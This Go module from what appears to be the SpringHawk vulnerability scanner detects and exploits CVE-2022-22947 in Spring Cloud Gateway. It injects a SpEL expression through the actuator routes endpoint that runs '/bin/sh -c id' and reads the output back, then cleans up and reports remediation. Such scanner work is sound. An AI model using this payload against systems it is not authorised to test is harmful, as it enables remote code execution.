package cve

// CVE-2022-22947: Spring Cloud Gateway SpEL RCE
// Affects Spring Cloud Gateway < 3.1.1 / < 3.0.7
// Attack: inject SpEL expression in route filter to get RCE via /actuator/gateway/routes

import (
	"context"
	"encoding/json"
	"fmt"
	"math/rand"
	"strings"
	"time"

	httpclient "github.com/springhawk/springhawk/internal/http"
	"github.com/springhawk/springhawk/internal/vulns"
	"github.com/springhawk/springhawk/pkg/models"
	"github.com/springhawk/springhawk/pkg/utils"
)

func init() { vulns.RegisterRemote(&GatewaySpEL{}) }

type GatewaySpEL struct{}

func (m *GatewaySpEL) ID() string          { return "CVE-2022-22947" }
func (m *GatewaySpEL) Name() string        { return "Spring Cloud Gateway SpEL RCE" }
func (m *GatewaySpEL) CVSS() float64       { return 10.0 }
func (m *GatewaySpEL) Severity() models.Severity { return models.SeverityCritical }
func (m *GatewaySpEL) Tags() []string      { return []string{"rce", "spring-cloud", "gateway", "spel", "actuator"} }
func (m *GatewaySpEL) Requirements() vulns.ModuleRequirements {
	return vulns.ModuleRequirements{RequiresSpringCloud: true, MinConfidence: 0}
}
func (m *GatewaySpEL) Description() string {
	return "Spring Cloud Gateway allows arbitrary code execution via SpEL expressions in route filter AddResponseHeader."
}

func (m *GatewaySpEL) Check(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	return m.run(ctx, target, client, false)
}

func (m *GatewaySpEL) Exploit(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	return m.run(ctx, target, client, true)
}

func (m *GatewaySpEL) run(ctx context.Context, target *models.Target, client *httpclient.Client, exploit bool) ([]*models.Finding, error) {
	routeID := fmt.Sprintf("hawk_%d", rand.Intn(99999))
	routePath := utils.JoinURL(target.BaseURL, fmt.Sprintf("actuator/gateway/routes/%s", routeID))
	refreshPath := utils.JoinURL(target.BaseURL, "actuator/gateway/refresh")

	// SpEL payload: detect via `id` command output (Linux) or `dir` (Windows)
	var spel string
	if exploit {
		spel = `#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","id"}).getInputStream()))}`
	} else {
		spel = `#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","echo SpringHawk-Check"}).getInputStream()))}`
	}

	route := map[string]interface{}{
		"id": routeID,
		"filters": []map[string]interface{}{{
			"name": "AddResponseHeader",
			"args": map[string]string{
				"name":  "X-Hawk-Result",
				"value": spel,
			},
		}},
		"uri":   "http://example.com",
		"order": 0,
	}

	body, _ := json.Marshal(route)

	// Step 1: POST route
	_, err := client.Post(ctx, routePath, "application/json",
		strings.NewReader(string(body)), nil)
	if err != nil {
		return nil, nil
	}

	// Step 2: Refresh gateway
	_, _ = client.Post(ctx, refreshPath, "application/x-www-form-urlencoded",
		strings.NewReader(""), nil)

	time.Sleep(200 * time.Millisecond)

	// Step 3: GET route and check response header for command output
	resp, err := client.Get(ctx, routePath, nil)
	if err != nil {
		return nil, nil
	}

	// Step 4: Cleanup
	defer client.Delete(ctx, routePath, nil) //nolint:errcheck

	var evidence string
	if exploit {
		// Check for Linux uid= or Windows dir output
		if strings.Contains(resp.BodyString, "uid=") || strings.Contains(resp.BodyString, "<DIR>") {
			evidence = fmt.Sprintf("Command execution confirmed. Output snippet: %s", truncate(resp.BodyString, 200))
		} else {
			return nil, nil
		}
	} else {
		if strings.Contains(resp.BodyString, "SpringHawk-Check") || resp.StatusCode == 200 {
			evidence = "SpEL evaluation confirmed — route accepted with executable expression."
		} else {
			return nil, nil
		}
	}

	f := &models.Finding{
		ID:          fmt.Sprintf("%s-%d", m.ID(), time.Now().UnixNano()),
		Type:        models.FindingTypeVuln,
		Severity:    m.Severity(),
		CVSS:        m.CVSS(),
		CVEIDs:      []string{"CVE-2022-22947"},
		Title:       "Spring Cloud Gateway: Server-Side Request Forgery + SpEL RCE",
		Description: m.Description(),
		URL:         target.BaseURL,
		Endpoint:    "/actuator/gateway/routes",
		Method:      "POST",
		Evidence:    evidence,
		Remediation: "Upgrade Spring Cloud Gateway to 3.1.1+ or 3.0.7+. Disable the gateway actuator or restrict access.",
		References:  []string{"https://spring.io/blog/2022/03/01/spring-cloud-gateway-cve-reports-published", "https://nvd.nist.gov/vuln/detail/CVE-2022-22947"},
		Tags:        m.Tags(),
		Timestamp:   time.Now(),
		ModuleID:    m.ID(),
		IsExploited: exploit,
	}
	return []*models.Finding{f}, nil
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
